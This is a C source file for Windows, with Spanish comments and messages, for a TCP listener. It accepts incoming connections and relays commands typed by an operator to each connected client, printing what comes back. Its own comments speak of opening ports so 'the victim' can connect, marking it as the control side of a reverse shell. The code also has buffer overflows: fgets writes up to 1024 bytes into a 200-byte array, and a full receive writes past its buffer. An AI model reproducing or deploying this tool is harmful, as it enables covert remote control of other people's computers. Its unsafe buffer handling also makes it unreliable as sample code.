#include <stdio.h>
#include <stdlib.h>
#include <winsock.h>

// Argumentos requeridos, ejecutar: server.exe [tu ipv4] [puerto]
// Abrir puertos para que la victima se pueda conectar

#pragma comment(lib, "ws2_32.lib")

#define MAX_PENDING 5
#define RECEIVE_BUFFER_SIZE 1024

void error(const char *message)
{
    fprintf(stderr, "%s: %d\n", message, WSAGetLastError());
    exit(1);
    return;
}

void close(SOCKET so)
{
    closesocket(so);
    WSACleanup();
    return;
}

void handle_client(int client_socket)
{
    char buffer[RECEIVE_BUFFER_SIZE];
    char message[200];
    int receive_message_size;

    if ((receive_message_size = recv(client_socket, buffer, RECEIVE_BUFFER_SIZE, 0)) < 0)
        error("Error al recibir datos");

    buffer[receive_message_size] = '\0';
    printf("Datos recibidos: \n%s\n", buffer);

    while (1)
    {
        printf("> ");
        fgets(message, RECEIVE_BUFFER_SIZE, stdin);
        fflush(stdin);

        if (strcmp(message, "SALIR\n") == 0)
            break;

        send(client_socket, message, strlen(message) + 1, 0);

        if ((receive_message_size = recv(client_socket, buffer, RECEIVE_BUFFER_SIZE, 0)) < 0)
            error("Error al recibir datos");

        buffer[receive_message_size] = '\0';
        printf(">> %s\n", buffer);
    }

    closesocket(client_socket);
    puts("Cliente desconectado correctamente.");
}

int main(int argc, char *argv[])
{
    SOCKET server_so, client_so;
    WSADATA wsa;
    char *ip;
    unsigned int client_length;
    unsigned short port;
    struct sockaddr_in server, client;

    if (argc != 3)
    {
        printf("Uso: %s <server_ip> <server_port>\n", argv[0]);
        return 1;
    }

    ip = argv[1];
    port = atoi(argv[2]);

    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
        error("Error al iniciar  WSAStartup");

    printf("Iniciando socket..\n");

    if ((server_so = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
        error("Error al crear el socket");

    printf("Socket creado correctamente.\n");

    memset(&server, 0, sizeof(server));
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_addr(ip);
    server.sin_port = htons(port);

    if (bind(server_so, (struct sockaddr *)&server, sizeof(server)) == SOCKET_ERROR)
        error("Error al enlazar el servidor");

    if (listen(server_so, MAX_PENDING) < 0)
        error("Error al escuchar peticiones");

    puts("Esperando conexiones entrantes..");

    while (1)
    {
        client_length = sizeof(client);

        if ((client_so = accept(server_so, (struct sockaddr *)&client, &client_length)) < 0)
            error("Error al aceptar al cliente.\n");

        printf("Nueva conexion aceptada:  %s\n", inet_ntoa(client.sin_addr));
        handle_client(client_so);
    }

    close(server_so);
    return 0;
}
